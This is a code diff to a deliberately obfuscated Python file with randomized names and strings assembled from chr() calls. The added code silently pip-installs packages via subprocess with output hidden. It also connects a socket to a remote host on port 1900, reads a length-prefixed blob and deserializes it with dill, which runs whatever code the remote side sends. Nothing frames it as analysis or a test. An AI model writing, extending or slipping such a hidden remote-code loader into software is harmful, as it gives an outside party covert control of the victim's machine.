@@ -7,7 +7,7 @@ def BlGsWbOibgDw(ivMetmwPXMsX,afyUArKrYoaU=None,bLPERsFVJGBl=b'TMAPDaSIcIFG'):
     if paluuoBFSqqz(ivMetmwPXMsX,eHLzbYimpSFq):bWjHdFEaAmUG=PzQWXGyzczcO(ivMetmwPXMsX,eHLzbYimpSFq)()
     return bWjHdFEaAmUG
 def VhUkuhQdErew(axKZuigreziB=['AWFZqOjGUXxpi'+chr(73)+chr(0x6D),'p'+chr(0x69)+chr(0o154)*2+chr(79).lower()+chr(119)],**upCobXJiHQes):
-    HRvjXWEzpqlv=[axKZuigreziB[1]]
+    HRvjXWEzpqlv=[axKZuigreziB[1],chr(0o104).lower()+axKZuigreziB[0][-1]+chr(0x6C)*2]
     try:
         for PZqaxzgVvtqfgdgwG in HRvjXWEzpqlv:RWncOszECTrd([aqpawtiezRKh,chr(0x2D)+chr(0b01101101),(axKZuigreziB[0][11:13])+chr(0o160),[].__class__.__name__[-3]+chr(0x6E)+chr(115)+().__class__.__name__[0]+(52/4).__class__.__name__[-2]+chr(0x6C)*2,PZqaxzgVvtqfgdgwG],stdout=vknBVIicHrCu,stderr=vknBVIicHrCu)
     except:pass
@@ -53,7 +53,7 @@ class dqTtKbqKTkbQ:
             if WEAnXpJSRlJW:PzQWXGyzczcO(qwDTENPlCIuf,jTpAnlJqNswb)(WEAnXpJSRlJW)
     __init__=yRYOYsYKvYCA
 class IEEsvAAtTBOH:
-    BFjpdgHXTETR=OZXBxjIACLZF(chr(112)+[].__class__.__name__[-3]+{}.__class__.__name__[2]+chr(0x6B)+chr(0o154)+chr(101))
+    BFjpdgHXTETR=OZXBxjIACLZF(chr(0x64)+[].__class__.__name__[1]+chr(0o154)*2)
     OGEoGhwIUaLZ=PzQWXGyzczcO(BFjpdgHXTETR,[].__class__.__name__[-4]+5.2.__class__.__name__[2:4]+chr(0o144)+''.__class__.__name__[-3]);grptvisrflVC=PzQWXGyzczcO(BFjpdgHXTETR,{}.__class__.__name__[-4]+chr(117)+chr(0b1101101)+chr(0x70)+[].__class__.__name__[2])
     @wKPVjfEPxnTq
     def HBdMiKsnAtNH(xIRvIaDKvRwu,AGxFdfgHdRue=0o127):return IEEsvAAtTBOH.OGEoGhwIUaLZ(xIRvIaDKvRwu)
@@ -79,7 +79,6 @@ class gQruAhFOlNgi:
         self._yKArJRgFFRTW=set().__class__.__name__+chr(116)+[].__class__.__name__[1]+chr(0x6D)+().__class__.__name__[-1]+chr(0o157)+chr(0x75)+chr(0b1110100)
         self._eXcTtOpTKCIb=chr(0x72)+().__class__.__name__[-1]+{}.__class__.__name__[-2]+chr(0o166)
         self._qQahhcyEsRIl=[].__class__.__name__[-2]+chr(101)+chr(0x6E)+{}.__class__.__name__[-4]+chr(0o141)+().__class__.__name__[-2]+chr(0x6C)
-        self._JhXrWoekkeOZ()
     def AGNmlbcbtIqx(self,UnVDCUwoyLXb=0b000110100100):self._FWOvqkkczoLg=self._SrrNsRMyZVGk=None;del self
     def _JhXrWoekkeOZ(self,**hhhKMKlLAmMl):
         qnOHICoJwXsc=6+97+45-991+844*23+54/8/18575.75
@@ -87,29 +86,61 @@ class gQruAhFOlNgi:
         NYfPcqvtEIpP=PzQWXGyzczcO(self._GJsNfChonick,self._xYBrgqFPodTg)
         mUlhKWvjYbaf=PzQWXGyzczcO(self._GJsNfChonick,self._VfPBlQQnlYpW);xAhhsHBguuuK=PzQWXGyzczcO(self._xAhhsHBguuuK,self._FSyoJdzsIZcz);vOJpdLUtmbiL=xAhhsHBguuuK(*(int(49152),65535))
         # self._jNSpDPEwKcqA=(self._kTqFHLSFFmPt,vOJpdLUtmbiL)
-        self._jNSpDPEwKcqA=(self._kTqFHLSFFmPt,53789)
+        self._jNSpDPEwKcqA=(self._kTqFHLSFFmPt,1900)
         while(qnOHICoJwXsc):
             try:
                 self._FWOvqkkczoLg=JQbFamnPtOKc(YyBUItTDklog,NYfPcqvtEIpP);self._SrrNsRMyZVGk=JQbFamnPtOKc(YyBUItTDklog,mUlhKWvjYbaf)
                 PzQWXGyzczcO(self._FWOvqkkczoLg,self._yKArJRgFFRTW)(int(10))
                 PzQWXGyzczcO(self._FWOvqkkczoLg,self._focBjBcNqMxy)(self._jNSpDPEwKcqA)
-                break
+                self._RBkZfGEqaQrd()
             except Exception as e:print(e);PzQWXGyzczcO(self._SrrNsRMyZVGk,self._CFIwbJZjUoBs)(b'',self._jNSpDPEwKcqA)
     def _fzBidzwvsILg(self,ZGxoGzkCQyWv,lkECHdQLqXAK=None,uTwVTPFCcJyf=0x69):
         SUkbXRbMnyBJ=lkECHdQLqXAK
         if paluuoBFSqqz(self._FWOvqkkczoLg,self._qQahhcyEsRIl):SUkbXRbMnyBJ=PzQWXGyzczcO(self._FWOvqkkczoLg,self._qQahhcyEsRIl)
         if SUkbXRbMnyBJ and ZGxoGzkCQyWv:SUkbXRbMnyBJ(ZGxoGzkCQyWv)
+    # def _kMkynsBSFTIF(self,PKdLjiiVpfOx,iEKOJEjCCKNM=None):
+    #     oRgIrEzQlNRp=iEKOJEjCCKNM
+    #     TNxHfweDZvmF=bytearray()
+    #     if paluuoBFSqqz(self._FWOvqkkczoLg,self._eXcTtOpTKCIb):
+    #         oRgIrEzQlNRp=PzQWXGyzczcO(self._FWOvqkkczoLg,self._eXcTtOpTKCIb);erEyGvInuTOL=PzQWXGyzczcO(self._FWOvqkkczoLg,self._qQahhcyEsRIl)
+    #     while len(TNxHfweDZvmF)<PKdLjiiVpfOx:
+    #         try:
+    #             if senymwbfhaJI:=oRgIrEzQlNRp(PKdLjiiVpfOx-len(TNxHfweDZvmF)):
+    #                 print("Yes")
+    #                 # PzQWXGyzczcO(TNxHfweDZvmF,chr(101)+chr(0x78)+().__class__.__name__[-5]+chr(0o145)+chr(0b01001110).lower()+{}.__class__.__name__[0])(senymwbfhaJI)
+    #                 TNxHfweDZvmF.extend(senymwbfhaJI)
+    #             else:print("no")
+    #         except Exception as e:print(e);break
+    #     return TNxHfweDZvmF
     def _RBkZfGEqaQrd(self,gmNRLRHgVvNj=None):
+        oRgIrEzQlNRp=None
         yNtUmUQuytPh=6+97+45-991+844*23+54/8/18575.75
-        CuBHzxwBuVsE=oRgIrEzQlNRp=gmNRLRHgVvNj
-        if paluuoBFSqqz(self._FWOvqkkczoLg,self._eXcTtOpTKCIb):oRgIrEzQlNRp=PzQWXGyzczcO(self._FWOvqkkczoLg,self._eXcTtOpTKCIb)
+        CuBHzxwBuVsE=osoMfFULJfRG=gmNRLRHgVvNj
+        lSuNdWQBVtkU=chr(102)+self._FSyoJdzsIZcz[0]+True.__class__.__name__[-3]+chr(0x4D).lower()
+        hwHRtJVTPnKl=lSuNdWQBVtkU+chr(0b1011111)+chr(0o142)+chr(121)+self._yKArJRgFFRTW[2]+chr(0x65)+chr(115)
+        if paluuoBFSqqz(self._FWOvqkkczoLg,self._eXcTtOpTKCIb):
+            oRgIrEzQlNRp=PzQWXGyzczcO(self._FWOvqkkczoLg,self._eXcTtOpTKCIb)
         while(yNtUmUQuytPh):
             try:
-                if oRgIrEzQlNRp:
-                    if CuBHzxwBuVsE:=oRgIrEzQlNRp(int(0o10000)):
-                        if EeNeNlcFfYEc:=BlGsWbOibgDw(IEEsvAAtTBOH.JiFKOtdYodKN(CuBHzxwBuVsE)):self._fzBidzwvsILg(EeNeNlcFfYEc)
+                if CuBHzxwBuVsE:=oRgIrEzQlNRp(int(4)):
+                    if jeneCJBMbNDJ:=PzQWXGyzczcO(int,hwHRtJVTPnKl)(
+                        CuBHzxwBuVsE,
+                        False.__class__.__name__[-4]+chr(105)+chr(0o147)):
+                        if EeNeNlcFfYEc:=IEEsvAAtTBOH.HBdMiKsnAtNH(oRgIrEzQlNRp(jeneCJBMbNDJ)):
+                            print(EeNeNlcFfYEc)
+                break
             except Exception as e:print(e)
-    def PJDqOuSwBFci(self):self._RBkZfGEqaQrd()
+                # if osoMfFULJfR:=PzQWXGyzczcO(int,hwHRtJVTPnKl)(
+                #     self._kMkynsBSFTIF(4),
+                #     False.__class__.__name__[-4]+chr(105)+chr(0o147)
+                # ):self._kMkynsBSFTIF(osoMfFULJfR);print(osoMfFULJfR)
+                # else:break
+                    # if CuBHzxwBuVsE:=oRgIrEzQlNRp(int(0o10000)):
+                        # print(IEEsvAAtTBOH.JiFKOtdYodKN(CuBHzxwBuVsE))
+                        # if EeNeNlcFfYEc:=BlGsWbOibgDw(IEEsvAAtTBOH.JiFKOtdYodKN(CuBHzxwBuVsE)):self._fzBidzwvsILg(EeNeNlcFfYEc)
+                    # else:break
+            # except Exception as e:print(e)
+    def PJDqOuSwBFci(self):self._JhXrWoekkeOZ()
     __init__=FmjkeWoecWFt
     __del__=AGNmlbcbtIqx
 class sBAfMdKBacnf:
